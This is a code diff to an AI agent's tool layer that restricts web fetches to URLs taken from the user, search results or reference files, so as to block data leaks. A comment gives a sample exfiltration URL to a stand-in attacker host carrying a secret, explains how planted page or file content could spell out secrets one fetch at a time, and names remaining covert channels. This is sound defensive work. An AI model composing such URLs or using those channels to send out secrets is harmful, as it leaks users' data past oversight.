@@ -5,7 +5,7 @@ Three trust boundaries live here:
   sources directory (read-only);
 - commands run in a sandbox with no network, no home directory and no
   environment variables (so no API keys);
-- web fetches are limited to public http(s) addresses.
+- web fetches are limited to public http(s) addresses, and to URLs the agent was given rather than ones it composed.
 """
 
 from __future__ import annotations
@@ -67,12 +67,14 @@ class Workspace:
         return names
 
 
-def make_tools(ws: Workspace, cfg, consulted: list, writable: set | None = None) -> dict[str, Tool]:
+def make_tools(ws: Workspace, cfg, consulted: list, writable: set | None = None, fetchable: set | None = None) -> dict[str, Tool]:
     """Build the tool set for one agent run.
 
     `consulted` collects every file and URL the agent actually opened, so a rule can later check
     that cited sources are real. `writable` limits write_file to an engineer's own files.
+    `fetchable` holds the URLs web_fetch may open (see web_fetch); the run's tools add to it.
     """
+    fetchable = set() if fetchable is None else fetchable
 
     def list_files(a):
         return "\n".join(ws.files(a.get("path", "."))[:400]) or "(no files)"
@@ -87,7 +89,10 @@ def make_tools(ws: Workspace, cfg, consulted: list, writable: set | None = None)
         while last < len(lines) and (last == first or size + len(lines[last]) <= PAGE):  # at least one line, then up to a page
             size, last = size + len(lines[last]), last + 1
         more = f"\n… [lines {first + 1}-{last} of {len(lines)}; call again with offset={last + 1} for the rest]" if last < len(lines) else ""
-        return "".join(lines[first:last]) + more or "(empty)"
+        text = "".join(lines[first:last])
+        if ws.name(target).startswith("sources/"):  # reference files come from the user; workspace files are written by agents
+            fetchable.update(urls(text))
+        return text + more or "(empty)"
 
     def search_files(a):
         pattern, hits = re.compile(a["pattern"]), []
@@ -119,9 +124,16 @@ def make_tools(ws: Workspace, cfg, consulted: list, writable: set | None = None)
 
     def web_search(a):
         results = search_web(a["query"])  # results are leads, not sources: a page counts once it is fetched
+        fetchable.update(r["url"].split("#")[0] for r in results)
         return "\n\n".join(f"{r['title']}\n{r['url']}\n{r['snippet']}" for r in results) or "(no results)"
 
     def web_fetch(a):
+        # Leaking data takes a URL the agent composed (https://evil.example/?d=<secret>). Such a URL never appears in
+        # the user's messages, a search result or a reference file, so only URLs from those are opened. URLs in fetched
+        # pages and workspace files do not count: either could be planted to spell out a secret one fetch at a time.
+        # ponytail: the choice among allowed URLs and the search query still carry a few bits; an egress proxy closes that.
+        if a["url"].split("#")[0] not in fetchable:
+            raise PermissionError(f"{a['url']} did not come from the user, a search result or a reference file; fetch URLs exactly as they appear there")
         page = http_get(a["url"])
         consulted.append(a["url"])
         return clip(html_to_text(page) if "<html" in page[:2000].lower() or "<!doctype" in page[:200].lower() else page)
@@ -231,6 +243,17 @@ def detect_sandbox() -> str:
 # --- web ---------------------------------------------------------------------------------------
 
 _BROWSER = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"}
+
+
+def urls(text: str) -> set[str]:
+    """The http(s) URLs in a text, without fragments or trailing punctuation."""
+    found = set()
+    for url in re.findall(r"https?://[^\s<>\"'`]+", text):
+        url = url.split("#")[0].rstrip(".,;:!?]")
+        while url.endswith(")") and url.count("(") < url.count(")"):  # keep Wikipedia's Foo_(bar), drop "(see https://x)"
+            url = url[:-1].rstrip(".,;:!?]")
+        found.add(url)
+    return found
 
 
 def check_public(url: str) -> None:
